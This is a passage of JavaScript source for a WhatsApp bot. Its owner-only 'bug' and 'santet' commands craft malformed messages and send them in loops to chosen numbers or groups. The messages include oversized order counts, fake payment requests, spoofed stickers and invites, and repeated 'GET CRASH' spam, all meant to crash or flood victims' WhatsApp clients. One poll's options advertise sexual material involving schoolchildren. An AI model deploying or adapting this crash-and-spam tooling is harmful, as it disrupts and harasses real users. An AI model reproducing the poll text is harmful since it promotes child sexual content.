"fileEncSha256": "dENBk3fbczAtCSQCSld7QgpDTc8qcAKQQs+70YDjWYs=",
"directPath": "/v/t62.7119-24/25998581_433881065276377_966985398741330442_n.enc?ccb=11-4&oh=01_AVxJQ5tFKItPezPsVcHVcr6wNVNiZKZjbtTqCXShnXb_hQ&oe=62EEDFD5",
"mediaKeyTimestamp": "1657288637",
}
}), { userJid: m.chat, quoted: doc })
haikal.relayMessage(m.chat, document.message, { messageId: document.key.id })
}
break
//=================================================//
case 'bug4': {
if (!mek.key.fromMe) return reply('Fitur Khusus Owner!')
if (isBan) throw sticBanLu(from)

var extended = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"extendedTextMessage": {
"text": `https://chat.whatsapp.com/Jh7zaCSnPCBC4gdYOEVm0K\n\n© 𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲`,
"matchedText": "https://chat.whatsapp.com/Jh7zaCSnPCBC4gdYOEVm0K",
"description": "Undangan Grup WhatsApp",
"title": `© 𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 ${ngazap(prefix)}`,
"previewType": "NONE",
}
}), { userJid: m.chat, quoted: doc })
haikal.relayMessage(m.chat, extended.message, { messageId: extended.key.id })
}
break
//=================================================//
case 'bug5': {
if (!mek.key.fromMe) return reply('Fitur Khusus Owner!')
if (isBan) throw sticBanLu(from)
var sticker = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"stickerMessage": {
"url": "https://mmg.whatsapp.net/d/f/At6EVDFyEc1w_uTN5aOC6eCr-ID6LEkQYNw6btYWG75v.enc",
"fileSha256": "YEkt1kHkOx7vfb57mhnFsiu6ksRDxNzRBAxqZ5O461U=",
"fileEncSha256": "9ryK8ZNEb3k3CXA0X89UjCiaHAoovwYoX7Ml1tzDRl8=",
"mediaKey": "nY85saH7JH45mqINzocyAWSszwHqJFm0M0NvL7eyIDM=",
"mimetype": "image/webp",
"height": 64,
"width": 64,
"directPath": "/v/t62.7118-24/19433981_407048238051891_5533188357877463200_n.enc?ccb=11-4&oh=01_AVwXO525CP-5rmcfl6wgs6x9pkGaO6deOX4l6pmvZBGD-A&oe=62ECA781",
"fileLength": "7774",
"mediaKeyTimestamp": "1657290167",
"isAnimated": false,
}
}), { userJid: m.chat, quoted: doc })
haikal.relayMessage(m.chat, sticker.message, { messageId: sticker.key.id })
}
break
//=================================================//
case 'bug6': {
if (!mek.key.fromMe) return reply('Fitur Khusus Owner!')
if (isBan) throw sticBanLu(from)
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./baseikal/image/hwmodsgans.jpg') }, { upload: haikal.waUploadToServer })
var extended = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"extendedTextMessage": {
"text": "https://wa.me/c/6285814480623",
"matchedText": "https://wa.me/c/6285814480623",
"description": "Developer © 𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲\nWhatsApp / Script Bot \n\nORDER ? CHAT AJA 👋",
"title": `© 𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲${ngazap(prefix)}`,
"previewType": "NONE",
"jpegThumbnail": messa.imageMessage,
}
}), { userJid: m.chat, quoted: doc })
haikal.relayMessage(m.chat, extended.message, { messageId: extended.key.id })
}
break
//=================================================//
case 'bug7': {
if (!mek.key.fromMe) return reply('Fitur Khusus Owner!')
if (isBan) throw sticBanLu(from)
var contact = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"contactMessage": {
"displayName": `© 𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 ${ngazap(prefix)}`,
"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;;;;\nFN:Haikal\nitem1.TEL;waid=6285814480623:+62 857-1417-0944\nitem1.X-ABLabel:Ponsel\nPHOTO;BASE64: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\nX-WA-BIZ-DESCRIPTION:Developer © 𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲WhatsApp / Script Bot ORDER ? CHAT AJA 👋\nX-WA-BIZ-NAME:Haikal\nEND:VCARD",
}
}), { userJid: m.chat, quoted: doc })
haikal.relayMessage(m.chat, contact.message, { messageId: contact.key.id })
}
break
//=================================================//
case 'bugliveloc': {
if (!mek.key.fromMe) return reply('Fitur Khusus Owner!')
if (isBan) throw sticBanLu(from)
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./baseikal/image/hwmodsgans.jpg') }, { upload: haikal.waUploadToServer })
var liveLocation = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"liveLocationMessage": {
"degreesLatitude": -6.9367014,
"degreesLongitude": 107.7228574,
"caption": `© 𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 ${ngazap(prefix)}`,
"sequenceNumber": "1657237469254001",
"jpegThumbnail": messa.imageMessage,
}
}), { userJid: m.chat, quoted: doc })
haikal.relayMessage(m.chat, liveLocation.message, { messageId: liveLocation.key.id })
}
break
case 'buglokasi': {
if (!mek.key.fromMe) return reply('Fitur Khusus Owner!')
if (isBan) throw sticBanLu(from)
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./baseikal/image/hwmodsgans.jpg') }, { upload: haikal.waUploadToServer })
var location = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"locationMessage": {
"degreesLatitude": -6.936928157735237,
"degreesLongitude": 107.72270679473877,
"caption": `© 𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 ${ngazap(prefix)}`,
"jpegThumbnail": messa.imageMessage,
}
}), { userJid: m.chat, quoted: doc })
haikal.relayMessage(m.chat, location.message, { messageId: location.key.id })
}
break
//=================================================//
case 'buginvite': {
if (!mek.key.fromMe) return reply('Fitur Khusus Owner!')
if (isBan) throw sticBanLu(from)
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./baseikal/image/hwmodsgans.jpg') }, { upload: haikal.waUploadToServer })
var groupInvite = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"groupInviteMessage": {
"groupJid": "85296556573-1328272333@g.us",
"inviteCode": "wFHwtOxGQN8OwK2x",
"inviteExpiration": `MY NAME 𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH ${ngazap(prefix)}`,
"groupName": `MY NAME 𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH ${ngazap(prefix)}`,
"caption": `${ngazap(prefix)}`,
"jpegThumbnail": messa.imageMessage,
}
}), { userJid: m.chat, quoted: doc })
haikal.relayMessage(m.chat, groupInvite.message, { messageId: groupInvite.key.id })
}
break
//=================================================//
case 'bugtroli': {
if (!mek.key.fromMe) return reply('Fitur Khusus Owner!')
if (isBan) throw sticBanLu(from)
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./baseikal/image/hwmodsgans.jpg') }, { upload: haikal.waUploadToServer })
var order = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 "orderMessage": {
"orderId": "449756950375071",
"orderImage": messa.imageMessage,
"itemCount": 100000000000,
"status": "INQUIRY",
"surface": "CATALOG",
"message": `© 𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 ${ngazap(prefix)}`,
"jpegThumbnail":fs.readFileSync('./baseikal/image/pict.jpg'),
"orderTitle": `© 𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 ${ngazap(prefix)}`,
"sellerJid": "6285814480623@s.whatsapp.net",
"token": "AR40+xXRlWKpdJ2ILEqtgoUFd45C8rc1CMYdYG/R2KXrSg==",
"totalAmount1000": "500000000000000",
"totalCurrencyCode": "IDR",
}
}), { userJid: m.chat, quoted: doc })
haikal.relayMessage(m.chat, order.message, { messageId: order.key.id })
}
break
//=================================================//
case 'bugcatalog': {
if (!mek.key.fromMe) return reply('Fitur Khusus Owner!')
if (isBan) throw sticBanLu(from)
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./baseikal/image/hwmodsgans.jpg') }, { upload: haikal.waUploadToServer })
var catalog = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"productMessage": {
"product": {
"productImage": messa.imageMessage,
"productId": "449756950375071",
"title": `© 𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 ${ngazap(prefix)}`,
"description": `© 𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲`,
"jpegThumbnail": mekih,
"currencyCode": "IDR",
"footerText": `© 𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲`,
"priceAmount1000": "10000000",
"productImageCount": 1,
"firstImageId": 1,
"salePriceAmount1000": "10000000",
"retailerId": `© 𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲`,
"url": "wa.me/6285814480623"
},
"businessOwnerJid": "6285814480623@s.whatsapp.net",
}
}), { userJid: m.chat, quoted: doc })
haikal.relayMessage(m.chat, catalog.message, { messageId: catalog.key.id })
}
break
case 'polling': {
if (!mek.key.fromMe) return reply('Fitur Khusus Owner!')
if (isBan) throw sticBanLu(from)
var pollCreation = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"pollCreationMessage": {
"name": "BUG POLLING 𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH",
"options": [
	{
"optionName": "KUMPULAN BOKEP REMAJA VIRAL 27/12/2022"
	},
	{
"optionName": "BOKEP SMP"
	},
	{
"optionName": "BOKEP SMK"
	},
	{
"optionName": "BOKEP VIRAL"
	},
	{
"optionName": "VOTE SEMUANYA DONG LENKAP FULL 18+"
	}
],
"selectableOptionsCount": 5
	}
}), { userJid: m.chat, quoted: doc })
haikal.relayMessage(m.chat, pollCreation.message, { messageId: pollCreation.key.id })
deploy('Succes')
}
break
case 'catalogpc': case 'cataloggc':  {
if (!mek.key.fromMe) return reply('Fitur Khusus Owner!')
if (isBan) throw sticBanLu(from)
if (args.length < 1) return reply(`*Syntax Error!*\n\nUse : ${command} idGroup|amount spam|timer\nExample : ${command} 62888@g.us|1|10s\n\n\ns = Second/Detik\n\nDi Usahakan Bot Udah Masuk Group Nya`)
num = q.split('|')[0]
jumlah = q.split('|')[1]
for (let i = 0; i < jumlah; i++) {
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./baseikal/image/hwmodsgans.jpg') }, { upload: haikal.waUploadToServer })
var catalog = generateWAMessageFromContent(num, proto.Message.fromObject({
"productMessage": {
"product": {
"productImage": messa.imageMessage,
"productId": "449756950375071",
"title": `© 𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 ${ngazap(prefix)}`,
"description": `© 𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲`,
"currencyCode": "IDR",
"footerText": `© 𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲`,
"productImageCount": 1,
"firstImageId": 1,
"retailerId": `© 𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲`,
"url": "wa.me/6285814480623"
},
"businessOwnerJid": "6285814480623@s.whatsapp.net",
}
}), { userJid: m.chat, quoted: doc})
haikal.relayMessage(num, catalog.message, { messageId: catalog.key.id })
}
deploy(`Succes`)
}
break
case 'paybro' : {
if (!mek.key.fromMe) return reply('Fitur Khusus Owner!')
if (isBan) throw sticBanLu(from)
haikal.relayMessage(m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@s.whatsapp.net", { requestPaymentMessage: { Message: { extendedTextMessage: { text: teks, currencyCodeIso4217: 'IDR', requestFrom: '0@s.whatsapp.net', expiryTimestamp: 8000, amount: 1, contextInfo:{"externalAdReply": {"title": `SC 𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲`,"body": `Selamat ${salam} kak ${pushname}`,
mimetype: 'audio/mpeg', caption: `${buttonkal}`,
showAdAttribution: true,
sourceUrl: `https://bit.ly/3RBU6DN`,
thumbnailUrl: 'https://telegra.ph/file/a5e229afeb4dad4f35204.jpg', 
thumbnail: kalimage,
}
}}}}}, { quoted:doc})
}
break
//=================================================//
case 'santetdia': {
if (!mek.key.fromMe) return reply('Fitur Khusus Owner!')
if (isBan) throw sticBanLu(from)
if (args.length < 1) return reply(`*Syntax Error!*\n\nUse : ${command} idGroup|amount spam|timer\nExample : ${command} 62888@g.us|1|10s\n\n\ns = Second/Detik\n\nDi Usahakan Bot Udah Masuk Group Nya`)
num = q.split('|')[0]
jumlah = q.split('|')[1]
for (let i = 0; i < jumlah; i++) {
m.reply(`Oke 𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 >.<`)
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./baseikal/image/hwmodsgans.jpg') }, { upload: haikal.waUploadToServer })
var requestPaymentMessage = generateWAMessageFromContent(num, proto.Message.fromObject({
"requestPaymentMessage": {
"currencyCodeIso4217": "IDR",
"amount1000": "100",
"extendedTextMessage": {
"text": `MY DEVELOPER 𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH`,
}
}}), { userJid: m.chat, quoted: doc})
haikal.relayMessage(num, requestPaymentMessage.message, { messageId: requestPaymentMessage.key.id })
}
reply(`Succes`)
}
break
case 'santetgc': {
if (!mek.key.fromMe) return reply('Fitur Khusus Owner!')
if (isBan) throw sticBanLu(from)
if (args.length < 1) return reply(`*Syntax Error!*\n\nUse : ${command} idGroup|amount spam|timer\nExample : ${command} 62888@g.us|1|10s\n\n\ns = Second/Detik\n\nDi Usahakan Bot Udah Masuk Group Nya`)
num = q.split('|')[0]
jumlah = q.split('|')[1]
for (let i = 0; i < jumlah; i++) {
m.reply(`Succes`)
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./baseikal/image/hwmodsgans.jpg') }, { upload: haikal.waUploadToServer })
var requestPaymentMessage = generateWAMessageFromContent(num, proto.Message.fromObject({
"requestPaymentMessage": {
"currencyCodeIso4217": "IDR",
"amount1000": "100",
"extendedTextMessage": {
"text": `MY DEVELOPER 𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH`,
}
}}), { userJid: m.chat, quoted: doc})
haikal.relayMessage(num, requestPaymentMessage.message, { messageId: requestPaymentMessage.key.id })
}
reply(`Succes`)
}
break
//=================================================//
/*BUG WACAP */
case 'sendreaksi' : {
if (!mek.key.fromMe) return reply('Fitur Khusus Owner!')
if (isBan) throw sticBanLu(from)
Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
a = await haikal.sendMessage(m.chat, {react: { text: "🇮🇩", key: { remoteJid: m.chat, fromMe: true, id : m.key.id}}})
haikal.sendMessage(Pe, {text: "𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"}, {quoted: doc})
await sleep(20)
haikal.sendMessage(Pe, {text: "𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"}, {quoted: doc})
await sleep(20)
haikal.sendMessage(Pe, {text: "𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"}, {quoted: doc})
await sleep(20)
haikal.sendMessage(Pe, {text: "𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"}, {quoted: doc})
await sleep(20)
haikal.sendMessage(Pe, {text: "𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"}, {quoted: doc})
await sleep(20)
haikal.sendMessage(Pe, {text: "𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"}, {quoted: doc})
await sleep(20)
haikal.sendMessage(Pe, {text: "𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"}, {quoted: doc})
await sleep(20)
haikal.sendMessage(Pe, {text: "𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"}, {quoted: doc})
await sleep(20)
haikal.sendMessage(Pe, {text: "𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"}, {quoted: doc})
await sleep(20)
haikal.sendMessage(Pe, {text: "𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"}, {quoted: doc})
await sleep(20)
}
reply(`Succes`)
break
case 'sendbutton':
                    if (!mek.key.fromMe) return reply('Fitur Khusus Owner!')
                    if (!text) throw `Nomernya?`
                 buttonspc = [
                          {buttonId: `${prefix}djisdjiwdjjes`, buttonText: {displayText: buttonkal}, type: 1},
  {buttonId: 'babaabbabababa', buttonText: {displayText: buttonvirus}, type: 1},
  {buttonId: 'babababbababa', buttonText: {displayText: buttonkal}, type: 1}
]
                      
                    buttonMessagepc = {
                          text: "© 𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲",
                          footerText: 'KONTOL',
                          buttons: buttonspc,
                          headerType: 1
                      }
                      haikal.sendMessage(`${text}@s.whatsapp.net`, buttonMessagepc)
                      reply(`Succes`)
break
//=================================================//
/*BUG WACAP */
case 'unikiuyty' : {
if (isBan) throw sticBanLu(from)
if (!mek.key.fromMe) return reply('Fitur Khusus Owner!')
Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@g.us"
a = await haikal.sendMessage(m.chat, {react: { text: " ️", key: { remoteJid: m.chat, fromMe: true, id : m.key.id}}})
haikal.sendMessage(Pe, {text: "𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"}, {quoted: doc})
await sleep(20)
haikal.sendMessage(Pe, {text: "𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"}, {quoted: doc})
await sleep(20)
haikal.sendMessage(Pe, {text: "𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"}, {quoted: doc})
await sleep(20)
haikal.sendMessage(Pe, {text: "𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"}, {quoted: doc})
await sleep(20)
haikal.sendMessage(Pe, {text: "𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"}, {quoted: doc})
await sleep(10000)
}
reply(`Succes`)
break
//=================================================//
case 'gastod': {
if (isBan) throw sticBanLu(from)
if (!mek.key.fromMe) return reply('Fitur Khusus Owner!')
let user = global.db.data.users[m.sender]
user.afkTime = + new Date
user.afkReason = text
deploy(`${m.pushName} HELLO SAYA 𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH ${text ? ': ' + text : ''}`)
}
break
//=================================================//
case 'bugstiker':{
if (!mek.key.fromMe) return reply('Fitur Khusus Owner!')
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `HALLO AKU 𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH`
for (let i = 0; i < jumlah; i++) {
haikal.sendMessage(m.chat, {sticker: thumb},{quoted: {
key: { 
fromMe: false, 
participant: `0@s.whatsapp.net`, 
...({ remoteJid: "" }) 
}, 
"message": {
"stickerMessage": {
"url": "https://mmg.whatsapp.net/d/f/At6EVDFyEc1w_uTN5aOC6eCr-ID6LEkQYNw6btYWG75v.enc",
"fileSha256": "YEkt1kHkOx7vfb57mhnFsiu6ksRDxNzRBAxqZ5O461U=",
"fileEncSha256": "9ryK8ZNEb3k3CXA0X89UjCiaHAoovwYoX7Ml1tzDRl8=",
"mediaKey": "nY85saH7JH45mqINzocyAWSszwHqJFm0M0NvL7eyIDM=",
"mimetype": "image/webp",
"height": 64,
"width": 64,
"directPath": "/v/t62.7118-24/19433981_407048238051891_5533188357877463200_n.enc?ccb=11-4&oh=01_AVwXO525CP-5rmcfl6wgs6x9pkGaO6deOX4l6pmvZBGD-A&oe=62ECA781",
"fileLength": "7774",
"mediaKeyTimestamp": "1657290167",
"isAnimated": false,
}
}
}})
}
deploy(`Succes`)
}
break
case 'pengsui':{
if (!mek.key.fromMe) return reply('Fitur Khusus Owner!')
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `HALLO AKU 𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH`
for (let i = 0; i < jumlah; i++) {
haikal.sendMessage(m.chat, {requestPaymentMessage: thumb},{quoted: {
key: { 
fromMe: false, 
participant: `0@s.whatsapp.net`, 
...({ remoteJid: "" }) 
}, 
"requestPaymentMessage": {
"currencyCodeIso4217": "IDR",
"amount1000": "100",
"extendedTextMessage": {
"text": `MY DEVELOPER 𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH`,
}
}
}})
}
deploy(`Succes`)
}
break
//=================================================//
case 'bugdoc6':{
if (!mek.key.fromMe) return reply('Fitur Khusus Owner!')
